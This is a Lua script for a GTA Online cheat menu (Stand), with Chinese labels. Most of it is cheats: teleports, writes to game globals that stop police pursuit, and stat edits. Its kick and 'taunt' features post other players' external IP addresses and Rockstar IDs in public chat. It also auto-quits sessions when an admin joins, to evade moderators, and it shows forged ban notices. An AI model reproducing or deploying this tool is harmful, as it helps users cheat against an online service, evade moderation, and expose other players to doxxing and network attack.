menu.action(cargoteles, '传送到特殊货物', {'tpscargo'}, '传送并拾取特殊货物', function ()
    tp_scargo()
end)

menu.action(cargoteles, '传送到载具货物', {'tpvcargo'}, '传送并拾取载具货物', function ()
    tp_vcargo()
end)

local intteles = menu.list(TeleRoot, '室内传送', {}, '')

menu.action(intteles, '传送到电脑', {'tpdesk'}, '传送到办公桌上的电脑', function ()
    tp_desk()
end)

menu.action(intteles, '传送到夜总会的人', {'tpNCPerson'}, '传送到需要接送的夜总会员工', function ()
    tp_NCperson()
end)

menu.action(intteles, '传送到保险柜', {'tpsafe'}, '传送到事务所/游戏厅/夜总会内的保险箱', function ()
    tp_safe()
end)

menu.action(TeleRoot, '传送到摩托帮货物', {'tpMCproduct'}, '传送并拾取摩托帮货物', function ()
    tp_mcproduct()
end)

menu.action(TeleRoot, '传送到地堡货物', {'tpBSupplies'}, '传送并拾取地堡货物', function ()
    tp_bsupplies()
end)

menu.action(TeleRoot, '传送到公共电话亭', {'tppayphone'}, '传送到公共电话亭(必须已经打电话给富兰克林请求暗杀差事)', function ()
    tp_payphone()
end)

menu.action(TeleRoot, '传送到出口码头', {'tpEED'}, '传送到出口码头', function ()
    tp_eed()
end)

menu.list_action(onlinemode, "宣布", {"announcestat"}, "", { "最佳抢劫目标", "最穷的玩家", "最富的玩家", "最性奋的玩家"}, function(index, value, click_type)
    local ret = nil
    pluto_switch index do 
        case 1: 
            ret = get_best_mug_target()
            break
        case 2: 
            ret = get_poorest_player()
            break
        case 3:
            ret = get_richest_player()
            break
        case 4:
            ret = get_horniest_player()
            break
    end
    if ret ~= nil then
        chat.send_message(ret, false, true, true)
    end
end)

    onlineuse = menu.list(onlinemode, '其他', {}, '')

    menu.divider(onlineuse, "无视犯罪")

    menu.action(onlineuse, "警察无视犯罪", { "no_cops" }, "莱斯特", function()
        SET_INT_GLOBAL(2815059 + 4624, 5)
        SET_INT_GLOBAL(2815059 + 4625, 1)
        SET_INT_GLOBAL(2815059 + 4627, NETWORK.GET_NETWORK_TIME())
    end)
    
    menu.action(onlineuse, "贿赂当局", {}, "CEO技能", function()
        SET_INT_GLOBAL(2815059 + 4624, 81)
        SET_INT_GLOBAL(2815059 + 4625, 1)
        SET_INT_GLOBAL(2815059 + 4627, NETWORK.GET_NETWORK_TIME())
    end)
    
    menu.toggle_loop(onlineuse, "锁定倒计时", {}, "无视犯罪的倒计时", function()
        SET_INT_GLOBAL(2815059 + 4627, NETWORK.GET_NETWORK_TIME())
    end)
    
    menu.divider(onlineuse, "")
    
    local other_options_SnackArmour = menu.list(onlineuse, "零食护甲编辑", {}, "")
    
    menu.action(other_options_SnackArmour, "补满全部零食", {}, "", function()
        STAT_SET_INT("NO_BOUGHT_YUM_SNACKS", 30)
        STAT_SET_INT("NO_BOUGHT_HEALTH_SNACKS", 15)
        STAT_SET_INT("NO_BOUGHT_EPIC_SNACKS", 5)
        STAT_SET_INT("NUMBER_OF_ORANGE_BOUGHT", 10)
        STAT_SET_INT("NUMBER_OF_BOURGE_BOUGHT", 10)
        STAT_SET_INT("NUMBER_OF_CHAMP_BOUGHT", 5)
        STAT_SET_INT("CIGARETTES_BOUGHT", 20)
        util.toast("完成！")
    end)
    
    menu.action(other_options_SnackArmour, "补满全部护甲", {}, "", function()
        STAT_SET_INT("MP_CHAR_ARMOUR_1_COUNT", 10)
        STAT_SET_INT("MP_CHAR_ARMOUR_2_COUNT", 10)
        STAT_SET_INT("MP_CHAR_ARMOUR_3_COUNT", 10)
        STAT_SET_INT("MP_CHAR_ARMOUR_4_COUNT", 10)
        STAT_SET_INT("MP_CHAR_ARMOUR_5_COUNT", 10)
        util.toast("完成！")
    end)
    
    menu.action(other_options_SnackArmour, "补满呼吸器", {}, "", function()
        STAT_SET_INT("BREATHING_APPAR_BOUGHT", 20)
        util.toast("完成！")
    end)
    
    menu.divider(other_options_SnackArmour, "零食")

    menu.click_slider(other_options_SnackArmour, "PQ豆", {}, "+15 Health", 0, 99, 30, 1, function(value)
        STAT_SET_INT("NO_BOUGHT_YUM_SNACKS", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "宝力旺", {}, "+45 Health", 0, 99, 15, 1, function(value)
        STAT_SET_INT("NO_BOUGHT_HEALTH_SNACKS", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "麦提来", {}, "+30 Health", 0, 99, 5, 1, function(value)
        STAT_SET_INT("NO_BOUGHT_EPIC_SNACKS", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "易可乐", {}, "+36 Health", 0, 99, 10, 1, function(value)
        STAT_SET_INT("NUMBER_OF_ORANGE_BOUGHT", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "尿汤啤", {}, "", 0, 99, 10, 1, function(value)
        STAT_SET_INT("NUMBER_OF_BOURGE_BOUGHT", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "蓝醉香槟", {}, "", 0, 99, 5, 1, function(value)
        STAT_SET_INT("NUMBER_OF_CHAMP_BOUGHT", value)
        util.toast("完成！")
    end)
    menu.click_slider(other_options_SnackArmour, "香烟", {}, "-5 Health", 0, 99, 20, 1, function(value)
        STAT_SET_INT("CIGARETTES_BOUGHT", value)
        util.toast("完成！")
    end)

    menu.action(onlineuse, "请求重型装甲", {}, "请求弹道装甲和火神机枪", function()
        SET_INT_GLOBAL(2815059 + 884, 1)
    end)
    
    menu.action(onlineuse, "重型装甲包裹 传送到我", {}, "", function()
        local entity_model_hash = 1688540826
        for k, ent in pairs(entities.get_all_pickups_as_handles()) do
            local EntityHash = ENTITY.GET_ENTITY_MODEL(ent)
            if EntityHash == entity_model_hash and ENTITY.IS_ENTITY_A_MISSION_ENTITY(ent) then
                local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 2.0, 0.0)
                ENTITY.SET_ENTITY_COORDS(ent, coords.x, coords.y, coords.z, true, false, false, false)
            end
        end
    end)


    menu.toggle(onlinemode, "结束种族主义", {"endracism"}, "自动踢掉说脏话的玩家.", function(on)
        end_racism = on
    end)
    
    menu.toggle(onlinemode, "结束同性恋", {"endhomophobia"}, "自动踢出男同言论的玩家.", function(on)
        end_homophobia = on
    end)

    chat.on_message(function(packet_sender, message_sender, text, team_chat)
        toxicshit(packet_sender, message_sender, text, team_chat)
    end)

    
    entity_options = menu.list(menu.my_root(), "周围实体选项", {}, "")

	require("lib.libliblib.baibai_3")


    protex = menu.list(menu.my_root(), "防护选项", {}, "", function(); end)

    adbotblock = menu.list(protex, "广告机拦截", {"blockidiotbot"}, "自动踢出聊天频道里面发送广告的傻子", function(on)
    end)
    
    menu.divider(adbotblock, "~~~~~[抢战局主机效果更佳]~~~~~")
    menu.divider(adbotblock, "~~~~~[主机模式秒踢广告机]~~~~~")
    menu.divider(adbotblock, "~~~~~[无敌广告机都没用]~~~~~")

    kick_ad_bot = false
    menu.toggle(adbotblock, "启用拦截广告", {"blockidiotbot"}, "自动踢出聊天频道里面发送广告的傻逼", function(on)
        kick_ad_bot = on
    end)

    kick_ad_bot_chat = 1
    menu.textslider_stateful(adbotblock, "发送踢出内容", {"blockidiotbot"}, "发送踢出内容到公屏", {"通知","Stand通知","团队聊天不联网", "团队聊天联网", "全局聊天不联网", "全局聊天联网"}, function(s)
        kick_ad_bot_chat = s
    end)

    chat.on_message(function(sender_player_id, sender_player_name, message, is_team_chat)
        if kick_ad_bot then 
        if sender_player_id ~= players.user() then
            for n, w in pairs(banned_words) do
                if string.find(string.lower(message), w) then
                    if (kick_ad_bot_chat == 1) then	
                        notification("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", colors.blue)
                    end if (kick_ad_bot_chat == 2) then	
                        util.toast("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.")
                    end if (kick_ad_bot_chat == 3) then
                        chat.send_message("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", true, true, false)
                    end if (kick_ad_bot_chat == 4) then
                        chat.send_message("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", true, true, true)
                    end if (kick_ad_bot_chat == 5) then
                        chat.send_message("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", false, true, false)
                    end if (kick_ad_bot_chat == 6) then
                        chat.send_message("检测到广告机\n昵称:"..players.get_name(sender_player_name).."\nRID:"..players.get_rockstar_id(sender_player_name).. "\nIP:"..get_external_ip(sender_player_name) .." 已自动踢出.", false, true, true)
                    end
                    util.log("检测到广告机昵称 "..players.get_name(sender_player_name).." RID:"..players.get_rockstar_id(sender_player_name).. " IP:"..get_external_ip(sender_player_name) .." 已自动踢出.")
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("networkbail ".. players.get_name(sender_player_name))
                    end
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("invitehome ".. players.get_name(sender_player_name))
                    end
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("tpcayo ".. players.get_name(sender_player_name))
                    end
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("gotobeach ".. players.get_name(sender_player_name))
                    end
                    if players.exists(sender_player_name) then
                    menu.trigger_commands("adaptivekick ".. players.get_name(sender_player_name))
                   end
                end
            end
        end
    end
end)


    local anti_mugger = menu.list(protex, "新拦截劫匪")

    menu.toggle_loop(anti_mugger, "拦截劫匪--自我", {"blockstealerself"}, "防止你被抢劫.", function() 
        blockstealer()
    end)

    menu.toggle_loop(anti_mugger, "拦截劫匪--其他人", {"blockstealermult"}, "防止他人被抢劫.", function()
        blockstealerother()
    end)
    
    menu.toggle_loop(anti_mugger, "显示劫匪", {}, "", function ()
        show_mugger()
    end)

    menu.toggle_loop(protex,"无人机 导弹探测", {}, "当玩家驾驶无人机或发射导弹时发出通知，并在附近地图上显示", function ()
        if NETWORK.NETWORK_IS_SESSION_ACTIVE() then
            for player = 0, 32 do AddBlipForPlayerDrone(player) end
        end
    end, function()
        for i in pairs(blips) do RemoveBlipIndex(i) end
        notificationBits = 0
        nearbyNotificationBits = 0
    end)

    local toxic_text = "你正在攻击一位尊贵的2Take1用户.请立刻停止你的行为!\n--------¦baibai"

    menu.text_input(protex, "自定义嘲讽文字", {"Customize ridicule"}, "", function(value)
        toxic_text = value
    end, toxic_text)

    menu.toggle_loop(protex, "攻击嘲讽", {"toxic_text"}, "", function()
        for _, pid in ipairs(players.list(false, true, true)) do
            if players.is_marked_as_attacker(pid,1 << 0x03) or players.is_marked_as_attacker(pid,1 << 0x04) or players.is_marked_as_attacker(pid,1 << 0x05) or players.is_marked_as_attacker(pid,1 << 0x0C) or players.is_marked_as_attacker(pid,1 << 0x0D) or players.is_marked_as_attacker(pid,1 << 0x0E) then
                chat.send_message(PLAYER.GET_PLAYER_NAME(pid).. toxic_text .."\n你的个人信息:" .. "\nRID:" ..players.get_rockstar_id(pid).. "\nIP:" ..get_external_ip(pid).. "\n等级:".. players.get_rank(pid) ,false,true,true)
                    break
                end
            end
    end)

    local admin_bail = true
    menu.toggle(protex, "管理员退出", {"adminbail"}, "自动退出战局当一个管理员加入", function(on)
        admin_bail = on
        while admin_bail do
            if util.is_session_started() then
                for _, pid in players.list(false, true, true) do 
                    if players.is_marked_as_admin(pid) then 
                        notify("检测到管理员！快跑！.")
                        menu.trigger_commands("quickbail")
                    end    
                end
            end
            util.yield()
        end
    end, true)


    menu.action(protex, "超级清除", {"superclear"}, "", function()
        removeanything()
	end)

    menu.list_action(protex, "清除全部", {}, "", {"NPC", "载具", "物体", "可拾取物体", "货车", "发射物", "声音"}, function(index, name)
        clearall(index, name)
    end)

    throttler = menu.list(protex, "自动节流器", {}, "")

    require "lib.libliblib.EntityThrottler"

    local pool_limiter = menu.list(protex, "实体池限制", {}, "")

    menu.slider(pool_limiter, "人物池限制", {"pedlimit"}, "", 0, 256, 175, 1, function(amount)
        petlimit(amount)
    end)

    menu.slider(pool_limiter, "载具池限制", {"vehlimit"}, "", 0, 300, 150, 1, function(amount)
        vehlimit(amount)
    end)

    menu.slider(pool_limiter, "物体池限制", {"objlimit"}, "", 0, 2300, 750, 1, function(amount)
        objlimit(amount)
    end)

    menu.slider(pool_limiter, "投掷物池限制", {"projlimit"}, "", 0, 50, 25, 1, function(amount)
        projectilelimit(amount)
    end)

    menu.toggle_loop(pool_limiter, "启用实体池限制", {}, "", function()
        pool_limit()
    end)

	menu.divider(protex, "崩溃保护")

    local block_event_anthing = menu.list(protex, "阻止选项", {}, "", function() end)

    local block_effect = menu.list(protex, "拦截选项", {}, "", function() end)

    menu.toggle_loop(block_effect, "拦截粒子效果", {}, "", function()
        blockcrasheffect()
    end)
    
    menu.toggle_loop(block_effect, "拦截火焰效果", {}, "", function()
        blockfireeffect()
    end)

    menu.toggle_loop(protex, "野兽防护", {}, "防止你被变成野兽，但也会阻止其他人的战局事件.", function()
        antianimal()
    end)

    menu.toggle_loop(protex, "反笼子", {"anticage"}, "请不要在任务中开启", function()
        anticage()
    end)

	menu.toggle(block_event_anthing, "阻止网络事件", {}, "阻止网络事件传输", function(on_toggle)
        blocknetwork(on_toggle)  
	end)

	menu.toggle(block_event_anthing, "阻止传入", {}, "阻止网络事件传入", function(on_toggle)
        blockincoming(on_toggle)
	end)

	menu.toggle(block_event_anthing, "阻止传出", {}, "阻止网络事件传出", function(on_toggle)
        blockout(on_toggle)
	end)

	menu.toggle(protex, "自闭模式", {"panic"}, "没错就是自闭", function(on_toggle)
        chickenmode(on_toggle)
	end)

    funfeatures = menu.list(menu.my_root(), "玩乐选项", {}, "", function(); end)

    menu.toggle(funfeatures, "橙子模式", {""}, "按e使用激光眼", function(on)
    if on then
    menu.trigger_commands("trails")
    menu.trigger_commands("trailcolourrainbow 2")
    menu.trigger_commands("lasereyes")
    menu.trigger_commands("bodylight")
    menu.trigger_commands("forcefield")
    menu.trigger_commands("jedimode")
    menu.trigger_commands("screenvisual")
    else
    menu.trigger_commands("trails")
    menu.trigger_commands("trailcolourrainbow 0")
    menu.trigger_commands("lasereyes")
    menu.trigger_commands("bodylight")
    menu.trigger_commands("forcefield")
    menu.trigger_commands("jedimode")
    menu.trigger_commands("screenvisual")
    end
end)

local fakemessages_root = menu.list(funfeatures, "虚假消息", {}, "虚假信息屏幕")

menu.slider(fakemessages_root, "延迟虚假消息", {}, "在显示虚假消息之前等待多长时间（以秒为单位）", 0, 300, 0, 1, function(s)
    fake_alert_delay = s*1000
end)

local fake_suspend_date = "2000年7月15日"
menu.text_input(fakemessages_root, "自定义暂停日期", {"customsuspensiondate"}, "" , function(on_input)
    fake_suspend_date = on_input
end, "July 15, 2000")

local custom_alert = "你好世界！"
menu.action(fakemessages_root, "自定义虚假消息文本", {"customfakealert"}, "输入您的虚假消息应显示的内容", function(on_click)
    notification("请输入您希望警告显示的内容", colors.blue)
    menu.show_command_box("customfakealert" .. " ")
end, function(on_command)
    show_custom_alert_until_enter(on_command)
end)


alert_options = {"禁令1", "禁令2", "服务不可用", "Stand天下第一!", "暂停的", "自定义"}
menu.list_action(fakemessages_root, "假警报", {"fakealert"}, "", alert_options, function(index, value, click_type)
    pluto_switch index do 
        case 1: 
            show_custom_alert_until_enter("您已被禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
            break 
        case 2:
            show_custom_alert_until_enter("您已被永久禁止进入GTA在线模式。~n~返回Grand Theft Auto V。")
            break
        case 3:
            show_custom_alert_until_enter("Rockstar游戏服务当前不可用。~n~请返回Grand Theft Auto V。")
            break
        case 4:
            show_custom_alert_until_enter("Stand天下第一!")
            break
        case 5:
            show_custom_alert_until_enter("您已被禁止进入GTA在线模式直到 " .. fake_suspend_date .. ".~n~此外,您的GTA在线模式角色将被重置。~n~Grand Theft Auto V。")
            break
        case 6:
            show_custom_alert_until_enter(custom_alert)
            break
    end
end)

    action_lua = menu.list(funfeatures, "动作选项", {}, "", function(); end)

    action_lua_load = menu.action(action_lua, "加载动作选项", {""}, "", function()
        notification("正在加载动作脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.libliblib.Actions"
        menu.delete(action_lua_load)
    end)

    policecar = menu.list(funfeatures, "警车选项", {}, "", function(); end)

    policecar_load = menu.action(policecar, "加载警车选项", {""}, "", function()
        notification("正在加载警车脚本,请稍等",colors.blue)
        util.yield(2000)
        require "lib.libliblib.Policecar"
        menu.delete(policecar_load)
    end)


    local jesus_main = menu.list(funfeatures, "自动驾驶", {}, "")
    menu.textslider_stateful(jesus_main, "驾驶风格", {}, "单击以选择样式", style_names, function(index, value)
        pluto_switch value do
            case "正常":
                style = 786603
                break
            case "冲刺":
                style = 1074528293
                break
            case "半冲刺":
                style = 8388614
                break
            case "反向":
                style = 1076
                break
            case "无视红绿灯":
                style = 2883621
                break
            case "避开交通":
                style = 786603
                break
            case "极度避开交通":
                style = 6
                break
            case "有时超车":
                style = 5
                break
            end
        end)
        
    jesus_toggle = menu.toggle(jesus_main, "启用", {}, "", function(toggled)
        if toggled then
            local player = players.user_ped()
            local pos = ENTITY.GET_ENTITY_COORDS(player, false)
            local player_veh = entities.get_user_vehicle_as_handle()
    
            if not PED.IS_PED_IN_ANY_VEHICLE(player, false) then 
                util.toast("请在载具里使用. :)")
            return end
    
            local jesus = util.joaat("u_m_m_jewelsec_01")
            request_model(jesus)
    
            
            jesus_ped = entities.create_ped(26, jesus, pos, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(jesus_ped, true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(jesus_ped, true)
            PED.SET_PED_INTO_VEHICLE(player, player_veh, -2)
            PED.SET_PED_INTO_VEHICLE(jesus_ped, player_veh, -1)
            PED.SET_PED_KEEP_TASK(jesus_ped, true)
    
            if HUD.IS_WAYPOINT_ACTIVE() then
                local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
                TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(jesus_ped, player_veh, pos.x, pos.y, pos.z, 9999, style, 0)
            else
                util.toast("请先设置一个导航点. :/")
                    menu.set_value(jesus_toggle, false)
            end
        else
            if jesus_ped ~= nil then 
                entities.delete_by_handle(jesus_ped)
            end
        end
    end)
    
    menu.toggle(funfeatures, "特斯拉自动驾驶", {}, "", function(toggled)
            local player = players.user_ped()
            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)
            local tesla_ai = util.joaat("u_m_y_baygor")
            local tesla = util.joaat("raiden")
            request_model(tesla_ai)
            request_model(tesla)
            if toggled then     
                if PED.IS_PED_IN_ANY_VEHICLE(player, true) then
                    menu.trigger_commands("deletevehicle")
                end
        
                tesla_ai_ped = entities.create_ped(26, tesla_ai, playerpos, 0)
                tesla_vehicle = entities.create_vehicle(tesla, playerpos, 0)
                ENTITY.SET_ENTITY_INVINCIBLE(tesla_ai_ped, true)
                ENTITY.SET_ENTITY_VISIBLE(tesla_ai_ped, false)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ai_ped, true)
                PED.SET_PED_INTO_VEHICLE(player, tesla_vehicle, -2)
                PED.SET_PED_INTO_VEHICLE(tesla_ai_ped, tesla_vehicle, -1)
                PED.SET_PED_KEEP_TASK(tesla_ai_ped, true)
                VEHICLE.SET_VEHICLE_COLOURS(tesla_vehicle, 111, 111)
                VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 23, 8, false)
                VEHICLE.SET_VEHICLE_MOD(tesla_vehicle, 15, 1, false)
                VEHICLE.SET_VEHICLE_EXTRA_COLOURS(tesla_vehicle, 111, 147)
                menu.trigger_commands("performance")
        
                if HUD.IS_WAYPOINT_ACTIVE() then
                    local pos = HUD.GET_BLIP_COORDS(HUD.GET_FIRST_BLIP_INFO_ID(8))
                    TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ai_ped, tesla_vehicle, pos.x, pos.y, pos.z, 20, 786603, 0)
                else
                    TASK.TASK_VEHICLE_DRIVE_WANDER(tesla_ai_ped, tesla_vehicle, 20, 786603)
                end
            else
                if tesla_ai_ped ~= nil then 
                    entities.delete_by_handle(tesla_ai_ped)
                end
                if tesla_vehicle ~= nil then 
                    entities.delete_by_handle(tesla_vehicle)
                end
            end
    end)
    
local pet_root  = menu.list(funfeatures, "宠物选项", {}, "", function(); end)
local allpetsroot = menu.list(pet_root, "所有宠物", {}, "")
local activepet = menu.list(pet_root, "管理宠物", {}, "这些是你生成的宠物")

        menu.toggle(allpetsroot, "无敌", {}, "给你所有宠物无敌", function(on)
            if on then
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, true)
                end
            else
                for k,v in pairs(activedogs) do
                    ENTITY.SET_ENTITY_INVINCIBLE(v, false)
                end
            end
        end)

        menu.action(allpetsroot, "删除所有宠物", {}, "", function()
            for k,v in pairs(activedogs) do
                entities.delete_by_handle(v)
            end
        end)
       
menu.textslider(pet_root, "生成一只宠物", {}, "生成一个忠诚的同伴,它将跟随并保护你.", dogs, function(opt, breeds)
    local hash = util.joaat("A_C_" .. breeds)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do
        util.yield()
    end
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, math.random(1,4), 0)
    if getgroupsize(mygroup) >= 7 then
        notification("你已超过宠物的最大数量.")
    else
        local dog_ped = entities.create_ped(26, hash, coords, 0)
        activedogs[#activedogs+1] = dog_ped
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_AS_GROUP_MEMBER(dog_ped, mygroup)
        PED.SET_PED_NEVER_LEAVES_GROUP(dog_ped, true)
        PED.SET_GROUP_SEPARATION_RANGE(mygroup, 99999)

        local thispet = menu.list(activepet, breeds, {}, "")



        menu.text_input(thispet, "设置名字", {"setname"}, "", function(name)
            GenerateNametagOnPed(dog_ped, name)
        end)

        menu.toggle(thispet, "无敌", {}, "", function(on)
            if on then
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, true)
            else
                ENTITY.SET_ENTITY_INVINCIBLE(dog_ped, false)
            end
        end)



        if breeds ~= "Cat_01" then

            menu.toggle(thispet, "坐下", {}, "让您的宠物坐下.", function(on)
                if on then
                    if breeds == "Rottweiler" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[1], 0, true)
                    elseif breeds == "Retriever" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[2], 0, true)
                    elseif breeds == "Shepherd" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    elseif breeds == "Husky" then
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[3], 0, true)
                    else
                        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                        TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, doganimations[4], 0, true)

                    end
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)



            menu.action(thispet, "汪汪", {}, "汪汪汪!", function()
                if breeds == "Rottweiler" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_ROTWEILER", 0, true)
                elseif breeds == "Retriever" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_RETRIEVER", 0, true)
                elseif breeds == "Shepherd" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                elseif breeds == "Husky" then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SHEPHERD", 0, true)
                else
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_DOG_BARKING_SMALL", 0, true)
                end
                util.yield(5000)
                TASK.CLEAR_PED_TASKS(dog_ped)
            end)
        end



        if breeds == "Cat_01" then 
            menu.toggle(thispet, "躺下放松", {}, "", function(on)
                if on then
                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(dog_ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(dog_ped, "WORLD_CAT_SLEEPING_GROUND", 0, true)
                else
                    TASK.CLEAR_PED_TASKS(dog_ped)
                end
            end)
        end


        menu.action(thispet, "删除宠物", {}, "和平中撕扯, 我毛茸茸的朋友", function()
            entities.delete_by_handle(dog_ped)
            menu.delete(thispet)
        end)
    end
end)

    local jinx_pet
    menu.toggle_loop(funfeatures, "宠物猫Jinx", {}, "", function()
    if not jinx_pet or not ENTITY.DOES_ENTITY_EXIST(jinx_pet) then
        local jinx = util.joaat("a_c_cat_01")
        request_model(jinx)
        local pos = players.get_position(players.user())
        jinx_pet = entities.create_ped(28, jinx, pos, 0)
        PED.SET_PED_COMPONENT_VARIATION(jinx_pet, 0, 0, 1, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(jinx_pet, true)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(jinx_pet)
    TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(jinx_pet, players.user_ped(), 0, -0.3, 0, 7.0, -1, 1.5, true)
    util.yield(2500)
end, function()
    entities.delete_by_handle(jinx_pet)
    jinx_pet = nil
end)
    
    local player_jinx_army = {}
    
    menu.action(funfeatures, "找到Jinx", {}, "", function()
        local player = players.user_ped()
        local pos = ENTITY.GET_ENTITY_COORDS(player, false)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jinx_pet, pos.x, pos.y, pos.z, false, false, false)
    end)

    teleport = menu.list(menu.my_root(), "传送选项", {}, "", function(); end)
    teleport_place()

    detection = menu.list(menu.my_root(), "作弊者检测", {}, "", function(); end)

        menu.toggle_loop(detection, "玩家无敌检测", {}, "检测是否在使用无敌.", function()
        god_detection()
        end)
        
        menu.toggle_loop(detection, "车辆无敌检测", {}, "检测载具是否在使用无敌.", function()
        cargod_detection()
        end)

        menu.toggle_loop(detection, "未发布载具检测", {}, "检测是否有人在驾使尚未发布的车辆.", function()
        unreleased_car_detection()
            end)

        menu.toggle_loop(detection, "无法获得武器检测", {}, "检测是否有人使用无法在线获得的武器.", function()
        cantgetweapon_detection()
        end)

        menu.toggle_loop(detection, "无法获得载具检测", {}, "检测是否有人正在使用无法在线获得的车辆.", function()
        cantgetvar_detection()
        end)
          
        menu.toggle_loop(detection, "室内使用武器检测", {}, "检测玩家是否在室内使用武器.", function()
        usingweapon_detection()
        end)

        menu.toggle_loop(detection, "超级驾驶检测", {}, "检测是否有在修改载具车速.", function()
        supercar_detection()
        end)
 
        menu.toggle_loop(detection, "超级跑检测", {}, "检测玩家是否在使用超级跑（奔跑速度不合常理）", function()
        superrun_detection()
        end)

        menu.toggle_loop(detection, "观看检测", {}, "检测是否有人在观看你.", function()
        lookingyou_detection()
        end)

        menu.toggle_loop(detection, "传送检测", {}, "检测玩家是否使用了传送", function()
        tp_detection()
        end)

        menu.toggle_loop(detection, '天基炮检测', {''}, '当有人开始使用天基炮的时候告诉您.', function()
        orbdection()
        end)


GPB = menu.list(menu.my_root(), "聊天选项", {}, "", function(); end)

TRANROOT = menu.list(GPB, "聊天翻译", {}, "", function(); end)

local language_codes_by_enum = {
    [0]= "en-us",
    [1]= "fr-fr",
    [2]= "de-de",
    [3]= "it-it",
    [4]= "es-es",
    [5]= "pt-br",
    [6]= "pl-pl",
    [7]= "ru-ru",
    [8]= "ko-kr",
    [9]= "zh-tw",
    [10] = "ja-jp",
    [11] = "es-mx",
    [12] = "zh-cn"
}

local my_lang = lang.get_current()

function encode_for_web(text)
	return string.gsub(text, "%s", "+")
end


function get_iso_version_of_lang(lang_code)
    lang_code = string.lower(lang_code)
    if lang_code ~= "zh-cn" and lang_code ~= "zh-tw" then
        return string.split(lang_code, '-')[1]
    else
        return lang_code
    end
end

local iso_my_lang = get_iso_version_of_lang(my_lang)

local do_translate = false
menu.toggle(TRANROOT, "翻译聊天 [测试版]", {"nextton"}, "\n《 启动/关闭翻译 》\n该功能无法翻译自己发送的\n只能翻译其他人发送的消息\n会将消息自动发送在聊天\n并且其他人无法看见.\n", function(on)
    do_translate = on
end, false)

local only_translate_foreign = true
menu.toggle(TRANROOT, "只翻译不同游戏语言", {"nextforeignonly"}, "仅翻译来自不同游戏语言的用户的消息，从而节省 API 调用。 您应该保持此状态，以防止 Google 暂时阻止您的请求.", function(on)
